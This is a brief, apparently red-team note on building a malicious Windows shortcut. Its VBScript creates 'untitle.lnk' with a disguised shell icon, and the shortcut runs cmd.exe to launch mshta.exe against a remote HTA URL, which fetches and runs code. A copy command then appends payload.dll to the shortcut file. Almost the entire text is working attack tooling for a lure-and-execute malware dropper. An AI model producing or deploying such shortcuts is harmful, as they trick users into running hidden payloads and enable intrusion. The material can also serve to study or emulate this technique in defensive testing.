- Create Lnk file
~~~
Set WshShell = Wscript.CreateObject("Wscript.Shell") 
pt="E:\APT-TEST\" 
Set MyLink = WshShell.CreateShortcut(pt & "\untitle.lnk") 
MyLink.TargetPath = "C:\Windows\System32\cmd.exe"
MyLink.Arguments = "/c start mshta.exe http://127.0.0.1/test/mshta.txt 1000 158208"
MyLink.IconLocation = "C:\Windows\system32\SHELL32.dll,2"
MyLink.Save 

~~~

- Append payload.dll to lnk file
~~~
copy lnk + .dll /b newlink.lnk
~~~
